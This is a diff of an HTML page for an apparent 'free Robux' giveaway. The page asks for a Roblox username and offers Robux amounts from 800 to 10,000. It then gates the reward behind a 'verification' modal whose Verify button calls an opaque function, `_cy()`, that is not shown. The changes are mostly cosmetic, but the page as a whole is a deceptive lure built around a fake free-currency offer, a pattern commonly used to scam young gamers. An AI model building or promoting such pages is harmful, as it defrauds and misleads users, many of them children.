@@ -48,52 +48,52 @@
     ROBUX
   </span>
 </h1>
-<p class="text-gray-400 text-sm lg:text-md py-6 max-w-[72ch]">FREE robux limited offer, Robux allows you to purchase upgrades for your avatar or buy special abilities in experiences.</p>
+<p class="text-gray-400 text-sm lg:text-md py-6 max-w-[72ch]">FREE robux limited offer, Robux allows you to purchase upgrades for your avatar or buy special abilities in experiences.</p>  
 <div class="max-w-xl py-10 px-6">
     <input class="w-full px-4 py-2 rounded-xl shadow-md mb-4 text-lg border border-gray-300" id="username" placeholder="Enter your Roblox username" type="text"/>
     <button class="bg-[#272930] text-white px-6 py-2 rounded-xl hover:bg-gray-800 transition mb-6" id="search-button" onclick="fetchProfile()">Search</button>
 </div>
 
     <div class="hidden fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50" id="robux-selection-modal">
-        <div class="bg-white p-8 rounded-2xl shadow-xl max-w-5xl text-center animate-fade-in">
-            <div class="mt-8 text-center" id="profile">
-                <img class="w-32 h-32 mx-auto rounded-full mb-4 shadow-md" id="avatar"/>
-                <p class="text-2xl font-semibold" id="display-name"></p>
+        <div class="bg-white p-6 rounded-2xl shadow-xl max-w-2xl text-center animate-fade-in"> 
+            <div class="mt-6 text-center" id="profile">
+                <img class="w-24 h-24 mx-auto rounded-full mb-2 shadow-md" id="avatar"/>
+                <p class="text-xl font-semibold" id="display-name"></p>
             </div>
 
-            <div class="mt-10" id="resource-section">
-                <p class="block text-lg font-medium mb-6">Select robux amount</p>
-                <div class="grid grid-cols-2 gap-6">
-                    <div class="resource-option cursor-pointer text-center p-6 rounded-xl shadow-md border border-gray-300 hover:bg-gray-100 transition"
+            <div class="mt-8" id="resource-section">
+                <p class="block text-lg font-medium mb-4">Select robux amount</p>
+                <div class="grid grid-cols-2 gap-4">
+                    <div class="resource-option cursor-pointer text-center p-4 rounded-xl shadow-md border border-gray-300 hover:bg-gray-100 transition" 
                          onclick="selectResource(this, 800)">
-                        <img alt="800 Robux" class="w-10 h-10 mx-auto mb-3" src="https://imgur.com/l9Qdc3C.jpeg"/>
+                        <img alt="800 Robux" class="w-8 h-8 mx-auto mb-2" src="https://imgur.com/l9Qdc3C.jpeg"/>
                         <p class="text-xl font-semibold">800</p>
                     </div>
-                    <div class="resource-option cursor-pointer text-center p-6 rounded-xl shadow-md border border-gray-300 hover:bg-gray-100 transition"
+                    <div class="resource-option cursor-pointer text-center p-4 rounded-xl shadow-md border border-gray-300 hover:bg-gray-100 transition" 
                          onclick="selectResource(this, 1700)">
-                        <img alt="1700 Robux" class="w-10 h-10 mx-auto mb-3" src="https://imgur.com/l9Qdc3C.jpeg"/>
+                        <img alt="1700 Robux" class="w-8 h-8 mx-auto mb-2" src="https://imgur.com/l9Qdc3C.jpeg"/>
                         <p class="text-xl font-semibold">1,700</p>
                     </div>
-                    <div class="resource-option cursor-pointer text-center p-6 rounded-xl shadow-md border border-gray-300 hover:bg-gray-100 transition"
+                    <div class="resource-option cursor-pointer text-center p-4 rounded-xl shadow-md border border-gray-300 hover:bg-gray-100 transition" 
                          onclick="selectResource(this, 4500)">
-                        <img alt="4500 Robux" class="w-10 h-10 mx-auto mb-3" src="https://imgur.com/l9Qdc3C.jpeg"/>
+                        <img alt="4500 Robux" class="w-8 h-8 mx-auto mb-2" src="https://imgur.com/l9Qdc3C.jpeg"/>
                         <p class="text-xl font-semibold">4,500</p>
                     </div>
-                    <div class="resource-option cursor-pointer text-center p-6 rounded-xl shadow-md border border-gray-300 hover:bg-gray-100 transition"
+                    <div class="resource-option cursor-pointer text-center p-4 rounded-xl shadow-md border border-gray-300 hover:bg-gray-100 transition" 
                          onclick="selectResource(this, 10000)">
-                        <img alt="10000 Robux" class="w-10 h-10 mx-auto mb-3" src="https://imgur.com/l9Qdc3C.jpeg"/>
+                        <img alt="10000 Robux" class="w-8 h-8 mx-auto mb-2" src="https://imgur.com/l9Qdc3C.jpeg"/>
                         <p class="text-xl font-semibold">10,000</p>
                     </div>
                 </div>
-                <div class="flex justify-center mt-8">
-                    <button class="hidden bg-green-600 text-white px-8 py-3 rounded-xl hover:bg-green-700 transition text-lg"
-                            id="confirm-button"
+                <div class="flex justify-center mt-6">
+                    <button class="hidden bg-green-600 text-white px-6 py-2 rounded-xl hover:bg-green-700 transition" 
+                            id="confirm-button" 
                             onclick="confirmSelection()">
                         Confirm
                     </button>
                 </div>
             </div>
-            <button class="bg-gray-400 text-white px-6 py-3 rounded-xl hover:bg-gray-500 transition mt-6 text-lg"
+            <button class="bg-gray-400 text-white px-4 py-2 rounded-xl hover:bg-gray-500 transition mt-4" 
                     onclick="closeRobuxSelectionModal()">
                 Cancel
             </button>
@@ -109,7 +109,7 @@
     <div class="hidden fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50" id="error-modal">
         <div class="bg-white p-6 rounded-2xl shadow-xl max-w-sm text-center">
             <p class="text-red-600 font-semibold mb-4" id="error-modal-text">Error</p>
-            <button class="bg-red-500 text-white px-4 py-2 rounded-xl hover:bg-red-600 transition"
+            <button class="bg-red-500 text-white px-4 py-2 rounded-xl hover:bg-red-600 transition" 
                     onclick="closeErrorModal()">
                 Close
             </button>
@@ -119,7 +119,7 @@
     <div class="hidden fixed inset-0 z-50 flex items-center justify-center bg-black bg-opacity-50" id="verify-step">
         <div class="bg-white p-6 rounded-2xl shadow-xl max-w-sm text-center animate-fade-in">
             <p class="text-lg font-medium mb-4">Complete the verification to receive your robux.</p>
-            <button class="bg-[#272930] text-white px-4 py-2 rounded-xl hover:bg-gray-800 transition"
+            <button class="bg-[#272930] text-white px-4 py-2 rounded-xl hover:bg-gray-800 transition" 
                     onclick="_cy()">
                 Verify
             </button>
